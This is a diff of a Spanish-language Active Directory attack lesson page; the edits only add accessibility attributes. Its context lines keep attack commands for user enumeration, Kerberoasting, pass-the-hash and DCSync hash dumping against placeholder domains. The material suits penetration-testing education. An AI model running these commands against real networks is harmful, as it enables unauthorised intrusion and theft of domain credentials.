@@ -12,8 +12,8 @@
     <link rel="stylesheet" href="../styles.css">
 </head>
 <body>
-    <div class="bg-grid"></div><div class="bg-glow bg-glow-1"></div><div class="bg-glow bg-glow-2"></div>
-    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
+    <div class="bg-grid" aria-hidden="true"></div><div class="bg-glow bg-glow-1" aria-hidden="true"></div><div class="bg-glow bg-glow-2" aria-hidden="true"></div>
+    <nav class="navbar" id="navbar"><a href="../index.html" class="nav-brand" style="text-decoration:none"><div class="brand-icon"><svg aria-hidden="true" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><span class="brand-text">Cyber<span class="accent">Path</span> 2026</span></a></nav>
     <main class="lesson-page">
         <div class="lesson-breadcrumb"><a href="../index.html">Inicio</a><span>›</span><span>Fase 3</span><span>›</span><span>Lección 13</span></div>
         <div class="lesson-hero">
@@ -73,7 +73,7 @@
         </div>
 
         <div class="lesson-section" id="enumeracion"><h2>3. Enumeración de AD</h2>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Enumerar AD</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Enumerar AD</span></div>
                 <pre><code><span style="color:#546e7a"># Enumerar usuarios del dominio</span>
 <span style="color:#00e676">$</span> crackmapexec smb DC_IP -u user -p pass --users
 <span style="color:#00e676">$</span> enum4linux -a DC_IP
@@ -88,7 +88,7 @@
 
         <div class="lesson-section" id="kerberoasting"><h2>4. Kerberoasting</h2>
             <p class="lesson-text"><strong>Kerberoasting</strong> explota cuentas de servicio con SPN: solicitas un ticket de servicio (TGS) cifrado con la contraseña del servicio, y luego lo crackeas offline.</p>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Kerberoasting</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Kerberoasting</span></div>
                 <pre><code><span style="color:#546e7a"># Extraer tickets TGS</span>
 <span style="color:#00e676">$</span> impacket-GetUserSPNs empresa.local/user:pass -dc-ip DC_IP -request
 
@@ -99,7 +99,7 @@
 
         <div class="lesson-section" id="pth"><h2>5. Pass-the-Hash y Pass-the-Ticket</h2>
             <p class="lesson-text"><strong>Pass-the-Hash (PtH)</strong>: en lugar de crackear un hash NTLM, lo usas directamente para autenticarte. Windows acepta el hash como si fuera la contraseña.</p>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Pass-the-Hash</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Pass-the-Hash</span></div>
                 <pre><code><span style="color:#546e7a"># Acceder con hash NTLM (sin conocer la contraseña)</span>
 <span style="color:#00e676">$</span> impacket-psexec empresa.local/admin@DC_IP -hashes :NTLM_HASH
 <span style="color:#00e676">$</span> crackmapexec smb DC_IP -u admin -H NTLM_HASH
@@ -112,7 +112,7 @@
         <div class="lesson-section" id="golden-ticket"><h2>6. Golden Ticket y DCSync</h2>
             <p class="lesson-text"><strong>Golden Ticket</strong>: si obtienes el hash del usuario <code>krbtgt</code>, puedes crear tickets de Kerberos para CUALQUIER usuario, incluyendo Domain Admin. Es el ataque definitivo.</p>
             <p class="lesson-text"><strong>DCSync</strong>: simulas ser un Domain Controller y le pides al DC real que te envíe todos los hashes. Requiere privilegios de replicación.</p>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">DCSync</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">DCSync</span></div>
                 <pre><code><span style="color:#546e7a"># Extraer TODOS los hashes del dominio (DCSync)</span>
 <span style="color:#00e676">$</span> impacket-secretsdump empresa.local/admin:pass@DC_IP -just-dc</code></pre>
             </div>
@@ -120,7 +120,7 @@
 
         <div class="lesson-section" id="bloodhound"><h2>7. BloodHound: mapear rutas de ataque</h2>
             <p class="lesson-text"><strong>BloodHound</strong> analiza las relaciones de AD y visualiza rutas de ataque posibles en un grafo. Te muestra cómo escalar desde un usuario normal hasta Domain Admin.</p>
-            <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">BloodHound</span></div>
+            <div class="lesson-terminal"><div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">BloodHound</span></div>
                 <pre><code><span style="color:#546e7a"># Recopilar datos con SharpHound</span>
 <span style="color:#00e676">$</span> bloodhound-python -u user -p pass -d empresa.local -c All -ns DC_IP
 
